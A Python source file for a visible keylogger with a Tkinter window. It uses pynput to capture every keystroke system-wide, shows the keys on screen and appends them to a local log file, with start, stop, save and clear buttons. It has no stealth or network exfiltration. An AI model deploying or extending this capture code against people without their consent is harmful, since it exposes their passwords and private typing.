import os
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
from pynput import keyboard
import threading

# Log file setup
log_file = "keylog.txt"
is_logging = False
listener = None

# Function to update log
def on_press(key):
    try:
        key_str = ""

        if hasattr(key, "char") and key.char is not None:
            key_str = key.char  # Regular character keys
        else:
            key_str = f" [{key}] "  # Special keys (Shift, Enter, etc.)

        log_display.insert(tk.END, key_str)
        log_display.see(tk.END)

        with open(log_file, "a") as f:
            f.write(key_str)

    except Exception as e:
        print(f"Error: {e}")

# Start keylogger function
def start_keylogger():
    global listener, is_logging
    if not is_logging:
        is_logging = True
        log_display.insert(tk.END, "\n[*] Keylogger Started...\n", "info")
        listener = keyboard.Listener(on_press=on_press)
        listener.start()

# Stop keylogger function
def stop_keylogger():
    global listener, is_logging
    if is_logging and listener:
        is_logging = False
        listener.stop()
        log_display.insert(tk.END, "\n[*] Keylogger Stopped...\n", "info")

# Save log using file manager
def save_log():
    try:
        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt")],
            title="Save Keylog As"
        )
        if file_path:
            with open(file_path, "w") as f:
                f.write(log_display.get("1.0", tk.END))
            messagebox.showinfo("Success", f"Keylog saved at:\n{file_path}")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to save log: {e}")

# Clear log function
def clear_log():
    log_display.delete("1.0", tk.END)
    if os.path.exists(log_file):
        os.remove(log_file)
    messagebox.showinfo("Success", "Keylog cleared successfully!")

# GUI Setup
root = tk.Tk()
root.title("Keylogger")
root.geometry("1920x1080")  # Maximize to 1920x1080
root.configure(bg="#1E1E1E")

# Styling
style = ttk.Style()
style.configure("TButton", font=("Arial", 16), padding=10)
style.configure("TLabel", font=("Arial", 18), background="#1E1E1E", foreground="white")

# Header Label
header_label = ttk.Label(root, text="Keylogger", font=("Arial", 24, "bold"))
header_label.pack(pady=20)

# Scrollable Log Display
log_display = scrolledtext.ScrolledText(root, width=180, height=30, bg="#252526", fg="white", font=("Courier", 12))
log_display.pack(pady=20)

# Button Frame
button_frame = ttk.Frame(root)
button_frame.pack()

start_button = ttk.Button(button_frame, text="Start", command=lambda: threading.Thread(target=start_keylogger).start())
start_button.grid(row=0, column=0, padx=15, pady=10)

stop_button = ttk.Button(button_frame, text="Stop", command=stop_keylogger)
stop_button.grid(row=0, column=1, padx=15, pady=10)

save_button = ttk.Button(button_frame, text="Save Log", command=save_log)
save_button.grid(row=0, column=2, padx=15, pady=10)

clear_button = ttk.Button(button_frame, text="Clear Log", command=clear_log)
clear_button.grid(row=0, column=3, padx=15, pady=10)

root.mainloop()
